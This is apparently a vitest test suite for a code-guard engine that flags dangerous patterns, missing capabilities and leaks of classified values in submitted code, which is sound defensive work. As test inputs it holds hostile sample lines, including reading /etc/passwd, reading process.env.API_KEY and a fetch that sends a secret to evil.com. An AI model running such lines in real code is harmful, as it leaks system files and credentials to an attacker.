import { describe, it, expect } from "vitest";
import { guard } from "../src/engine.js";
import { Verdict } from "../src/types.js";
import type { CodeSubmission } from "../src/types.js";

function submission(code: string, capabilities: CodeSubmission["capabilities"] = []): CodeSubmission {
  return { code, language: "typescript", sessionId: "test-session", capabilities };
}

describe("guard", () => {
  describe("pattern validation", () => {
    it("denies eval usage", () => {
      const result = guard(submission(`const x = eval("1 + 1")`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
      expect(result.validationErrors.some((v) => v.rule === "no-eval")).toBe(true);
    });

    it("denies direct fs access", () => {
      const result = guard(submission(`fs.readFile("/etc/passwd", "utf-8")`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
      expect(result.validationErrors.some((v) => v.rule === "no-direct-fs")).toBe(true);
    });

    it("denies process.env access", () => {
      const result = guard(submission(`const key = process.env.API_KEY`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
      expect(result.validationErrors.some((v) => v.rule === "no-process-env")).toBe(true);
    });

    it("denies dynamic import", () => {
      const result = guard(submission(`const mod = await import("./evil.js")`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
      expect(result.validationErrors.some((v) => v.rule === "no-dynamic-import")).toBe(true);
    });

    it("denies new Function", () => {
      const result = guard(submission(`const fn = new Function("return this")`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
    });

    it("denies prototype pollution", () => {
      const result = guard(submission(`obj.__proto__.isAdmin = true`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
    });

    it("warns on console.log", () => {
      const result = guard(submission(`console.log("hello")`));
      expect(Verdict.isWarn(result.verdict)).toBe(true);
      expect(result.validationErrors.some((v) => v.rule === "no-console")).toBe(true);
    });

    it("allows safe code", () => {
      const code = `
        const x = 1 + 2;
        const arr = [1, 2, 3].map(n => n * 2);
        const obj = { name: "test", value: arr };
      `;
      const result = guard(submission(code));
      expect(Verdict.isAllow(result.verdict)).toBe(true);
    });

    it("ignores patterns inside string literals", () => {
      const code = `const msg = "don't eval() this string"`;
      const result = guard(submission(code));
      expect(Verdict.isAllow(result.verdict)).toBe(true);
    });

    it("ignores patterns inside comments", () => {
      const code = `// eval() is dangerous\nconst x = 1;`;
      const result = guard(submission(code));
      expect(Verdict.isAllow(result.verdict)).toBe(true);
    });
  });

  describe("capability checking", () => {
    it("denies network access without capability", () => {
      const code = `const data = await fetch("https://example.com")`;
      const result = guard(submission(code));
      expect(result.capabilityViolations.length).toBeGreaterThan(0);
      expect(result.capabilityViolations[0].required).toBe("network");
    });

    it("allows network access with capability granted", () => {
      const code = `const data = await httpGet("https://example.com")`;
      const result = guard(submission(code, [{ kind: "network", scope: { allowedHosts: ["example.com"] } }]));
      expect(result.capabilityViolations.length).toBe(0);
    });

    it("denies filesystem without capability", () => {
      const code = `const content = await readFile("data.txt")`;
      const result = guard(submission(code));
      expect(result.capabilityViolations.some((v) => v.required === "filesystem")).toBe(true);
    });

    it("allows filesystem with capability granted", () => {
      const code = `const content = await readFile("data.txt")`;
      const result = guard(submission(code, [{ kind: "filesystem", scope: { root: "/tmp", readonly: true } }]));
      expect(result.capabilityViolations.length).toBe(0);
    });
  });

  describe("classified leak detection", () => {
    it("detects classified value leaked to console", () => {
      const code = `
        const secret = classify("my-api-key");
        console.log(secret);
      `;
      const result = guard(submission(code));
      expect(result.classifiedLeaks.length).toBeGreaterThan(0);
      expect(result.classifiedLeaks[0].channel).toBe("stdout");
    });

    it("detects classified value leaked to network", () => {
      const code = `
        const secret = classify("api-key");
        fetch("https://evil.com", { body: secret });
      `;
      const result = guard(submission(code));
      expect(result.classifiedLeaks.some((l) => l.channel === "network")).toBe(true);
    });

    it("allows .map() on classified values (pure transformation)", () => {
      const code = `
        const secret = classify("my-api-key");
        const masked = secret.map(s => s.slice(0, 4) + "****");
      `;
      const result = guard(submission(code));
      expect(result.classifiedLeaks.length).toBe(0);
    });

    it("detects derived variable leaks", () => {
      const code = `
        const secret = classify("password");
        const derived = secret + " appended";
        console.log(derived);
      `;
      const result = guard(submission(code));
      expect(result.classifiedLeaks.length).toBeGreaterThan(0);
    });
  });

  describe("custom patterns", () => {
    it("applies user-defined patterns", () => {
      const code = `const x = dangerousOperation()`;
      const result = guard(submission(code), {
        customPatterns: [
          {
            pattern: /dangerousOperation/,
            rule: "no-dangerous",
            message: "dangerousOperation is banned",
            severity: "error",
          },
        ],
      });
      expect(Verdict.isDeny(result.verdict)).toBe(true);
    });
  });
});
